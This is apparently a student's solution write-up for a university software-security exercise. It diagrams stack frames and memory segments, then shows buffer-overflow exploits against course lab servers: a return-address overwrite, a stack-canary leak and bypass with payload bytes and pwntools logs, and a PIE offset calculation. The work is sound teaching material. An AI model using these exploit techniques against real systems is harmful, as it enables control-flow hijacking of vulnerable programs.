# INF226 Weekly Exercise 2 – Stacks, buffers & return-oriented programming

## Stack frames
### a)
**Point A**
```
---- stack frame of f() ----
int a = 5               (local variables)
main()'s framepointer   (old RBP)
address after line 4    (return address - next instruction in main)
----------------------------
---- stack frame of main() ----
argc, argv               (parameters)
(main's local vars)      (if any)
caller's frame pointer   (old RBP from startup code)
startup return address   (return address)
----------------------------
```


**Point B**
```
---- stack frame of g() ----
int t1 = 42              (local variable - h() has returned)
int x = 5                (parameter passed from f)
f()'s frame pointer      (old RBP)
address after line 10    (return address - next instruction in f)
----------------------------
---- stack frame of f() ----
int a = 5                (local variable)
main()'s frame pointer   (old RBP)
address after line 4     (return address - next instruction in main)
----------------------------
---- stack frame of main() ----
argc, argv               (parameters)
(main's local vars)      (if any)
caller's frame pointer   (old RBP from startup code)
startup return address   (return address)
----------------------------
```

**Point C**
```
---- stack frame of m() ----
int c = 8                (local variable)
int b = 3                (local variable)
int a = 2                (local variable)
g()'s frame pointer      (old RBP)
address after line 15    (return address - next instruction in g)
----------------------------
---- stack frame of g() ----
int t2                   (uninitialized - will get m's return value)
int t1 = 42              (local variable)
int x = 5                (parameter passed from f)
f()'s frame pointer      (old RBP)
address after line 10    (return address - next instruction in f)
----------------------------
---- stack frame of f() ----
int a = 5                (local variable)
main()'s frame pointer   (old RBP)
address after line 4     (return address - next instruction in main)
----------------------------
---- stack frame of main() ----
argc, argv               (parameters)
(main's local vars)      (if any)
caller's frame pointer   (old RBP from startup code)
startup return address   (return address)
----------------------------
```

### b)
# Stack Frame Layouts

**Case 1: `int a; char buffer[5];`**  
The `int` needs 4-byte alignment, and `char buffer[5]` needs 5 bytes but can start at any offset.

|     | 0   | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
|-----|-----|---|---|---|---|---|---|---|
| -16 |     |   |   |   | b | u | f | f |
| -8  | e | r |   |   | a |   |   |   |
| 0   | rbp |   |   |   |   |   |   |   |
| 8   | rip |   |   |   |   |   |   |   |
| 16  |     |   |   |   |   |   |   |   |

- `buffer[5]` at offset -16 to -12 (5 bytes: b, u, f, f, e, r)
- `int a` at offset -8 (4 bytes, 4-byte aligned)
- Total frame size: 16 bytes

**Case 2: `char *string = "Hello"; int a; char b; void *pointer;`**   
The pointers need 8-byte alignment, `int` needs 4-byte alignment, `char` can be anywhere.

|     | 0   | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
|-----|-----|---|---|---|---|---|---|---|
| -32 | ptr to "Hello" |   |   |   |   |   |   |   |
| -24 | void *pointer   |   |   |   |   |   |   |   |
| -16 |     |   |   |   | a |   |   | b |
| -8  |     |   |   |   |   |   |   |   |
| 0   | rbp |   |   |   |   |   |   |   |
| 8   | rip |   |   |   |   |   |   |   |
| 16  |     |   |   |   |   |   |   |   |

- `char *string` at offset -32 (8 bytes, 8-byte aligned, points to "Hello" in data section)
- `void *pointer` at offset -24 (8 bytes, 8-byte aligned)
- `int a` at offset -16 (4 bytes, 4-byte aligned)
- `char b` at offset -9 (1 byte, can be anywhere)
- Total frame size: 32 bytes

**Case 3: `char *prompt = "Your answer:"; char answer[] = "default";`**  
The pointer needs 8-byte alignment, the char array needs 8 bytes for "default\0".

|     | 0   | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
|-----|-----|---|---|---|---|---|---|---|
| -24 | ptr to "Your answer:" |   |   |   |   |   |   |
| -16 | d   | e | f | a | u | l | t | \0|
| -8  |     |   |   |   |   |   |   |   |
| 0   | rbp |   |   |   |   |   |   |   |
| 8   | rip |   |   |   |   |   |   |   |
| 16  |     |   |   |   |   |   |   |   |

- `char *prompt` at offset -24 (8 bytes, 8-byte aligned, points to "Your answer:" in data section)
- `char answer[]` at offset -16 (8 bytes for "default\0" - 7 chars + null terminator)
- Total frame size: 24 bytes

### c)
```bash
nikolai@LAPTOP-6UOFH1KM:~/documents/inf226/weekly-exercise2-returnorientedprogramming (main)$ ./layout
Address of local variable a:                  0x7ffdca58bc5c  [stack]
Address of heap-allocated memory:                 0x22daa2a0  [heap]
Address of uninitialized global variable b:         0x405060  [bss]
Address of initialized global variable d:           0x404040  [data]
Address of constant string "foo":                   0x402102  [rodata]
Address of function main:                           0x401176  [text]
``` 
**`objdump -h -j .data -j .rodata -j .text -j .bss  layout` | Result:**
```
.text    (code):           VMA = 0x0000000000401090, Size = 0x1b4
.rodata  (read-only data): VMA = 0x0000000000402000, Size = 0x182  
.data    (initialized):    VMA = 0x0000000000404020, Size = 0x1020
.bss     (uninitialized):  VMA = 0x0000000000405040, Size = 0x1020
```
**Memory layout** 
```
High Memory (0x7fff...)
+---------------------------------+
│            STACK                │  ← Local variable 'a' (0x7ffdca58bc5c)
│         (grows down)            │    Arguments, return addresses, local vars                 │
+---------------------------------+
... (large gap) ...
+---------------------------------+
|            HEAP                 │  ← malloc(1000) (0x22daa2a0) 
│         (grows up)              │    Dynamically allocated memory
+----------------------------------
... (gap) ...
Low Memory (0x40xxxx)
+---------------------------------+
│      BSS SEGMENT                │  ← char b[4096] (0x405060)
│   (uninitialized globals)       │    Zero-initialized at runtime
│         Size: 0x1020            │
+---------------------------------+
+---------------------------------+  
│     DATA SEGMENT                │  ← char d[4096] = "data" (0x404040)
│   (initialized globals)         │    Pre-initialized global variables
│         Size: 0x1020            │
+---------------------------------+
+---------------------------------+
│    RODATA SEGMENT               │  ← "foo" string literal (0x402102)
│   (read-only data)              │    String literals, const data
│         Size: 0x182             │
+---------------------------------+
+---------------------------------+
│     TEXT SEGMENT                │  ← main() function (0x401176)  
│      (executable code)          │    Machine code instructions
│         Size: 0x1b4             │
+---------------------------------+
```

### d) 
From `objdump we can see that:  
- `hackme` located at `0x401216`.
- `main` located at `0x4013e9`

this corresponds with the output of the server after sending: `io.send(b'-v' + p64(0x12345678))`
```
----
 -40: 0x00000000004014df    df  14   @  00  00  00  00  00
 -32: 0x00007ffdfccbb6c8    c8  b6  cb  fc  fd  7f  00  00
 -24: 0x0000000100000000    00  00  00  00  01  00  00  00
 -16: 0x0000000000000000    00  00  00  00  00  00  00  00
  -8: 0x000012345678762d     -   v   x   V   4  12  00  00
----
   0: 0x0000000000000000    00  00  00  00  00  00  00  00
   8: 0x00007fe88124f24a     J  f2   $  81  e8  7f  00  00
  16: 0x0000000000000000    00  00  00  00  00  00  00  00
  24: 0x00000000004013e9    e9  13   @  00  00  00  00  00
  32: 0x0000000100000000    00  00  00  00  01  00  00  00
lol
```

the return address of main is located at offset -8, so we need to write 16 bytes to overwrite the return address.
Payload structure: 16 bytes of padding + 8 bytes containing the address of hackme

**result:**
```bash
[+] Opening connection to inf226.puffling.no on port 6101: Done
[DEBUG] Sent 0x18 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  16 12 40 00  00 00 00 00                            │··@·│····│
    00000018
[+] Receiving all data: Done (9B)
[DEBUG] Received 0x9 bytes:
    b'You win!\n'
[*] Closed connection to inf226.puffling.no port 6101
You win!
```

### e)
1. Looked at stackdump with `b'-s`. Line 5 is the most likely canary (big endian contains 00 on the end)
2. Looked at stack with `b'-v'. Found out the payload structure: 8 bytes padding, 8 byte canary, 8 byte saved RBP, 8 byte return address.  
3. Found `<hackme> address using `objdump -d hackme_medium, address: `0x401236`. 
4. parses stackdump in python and created correct payload send it and got `You win!`.

```
(.venv) nikolai@LAPTOP-6UOFH1KM:~/documents/inf226/weekly-exercise2-returnorientedprogramming (main)$ python task-e.py
[+] Opening connection to inf226.puffling.no on port 6102: Done
[DEBUG] Sent 0x3 bytes:
    b'-s\n'
[DEBUG] Received 0xaa bytes:
    b'0000000000401495\n'
    b'00007fff2e0f2338\n'
    b'0000000100000000\n'
    b'00000000000a732d\n'
    b'2dc417609e81bf00\n'
    b'0000000000000001\n'
    b'00007f6c51bb424a\n'
    b'0000000000000000\n'
    b'0000000000401409\n'
    b'0000000100000000\n'
Raw leak:
0000000000401495
00007fff2e0f2338
0000000100000000
00000000000a732d
2dc417609e81bf00
0000000000000001
00007f6c51bb424a
0000000000000000
0000000000401409
0000000100000000

Potenital canary: 2dc417609e81bf00
Parsed canary: 0x2dc417609e81bf00
Payload length: 33
Payload (hex): 414141414141414100bf819e6017c42d424242424242424236124000000000000a
[DEBUG] Sent 0x21 bytes:
    00000000  41 41 41 41  41 41 41 41  00 bf 81 9e  60 17 c4 2d  │AAAA│AAAA│····│`··-│
    00000010  42 42 42 42  42 42 42 42  36 12 40 00  00 00 00 00  │BBBB│BBBB│6·@·│····│
    00000020  0a                                                  │·│
    00000021
[+] Receiving all data: Done (9B)
[DEBUG] Received 0x9 bytes:
    b'You win!\n'
[*] Closed connection to inf226.puffling.no port 6102
Result:
You win!
```

## f)
- '-v' ends up on slot -16
```
-16: 0x00000000000a762d   <-- input
 -8: 0xfad73a4caab8cf00   <-- stack canary
  0: 0x0000000000000001
  8: 0x00007fe39581424a
 16: 0x0000000000000000
 24: 0x000055a3dfde344f   <-- this looks like main
```
- '-s' output:
```
b'000055baec28d4e0\n'
b'00007ffe93990d48\n'
b'0000000100000000\n'
b'00000000000a732d\n'
b'7aa1ab6d020c9200\n'
b'0000000000000001\n'
b'00007f153831a24a\n'
b'0000000000000000\n'
b'000055baec28d44f\n'
b'0000000100000000\n'
```
- potential canary: 0xfad73a4caab8cf00   
- From the disassembly of hackme_hard:
    - main is at static offset 0x144f
    - hackme is at static offset 0x1249
- So the difference is: 0x206
```python
>>> 0x144f - 0x1249
518
>>> hex(518)
'0x206'
```
- hackme_addr = leaked_main_addr - 0x206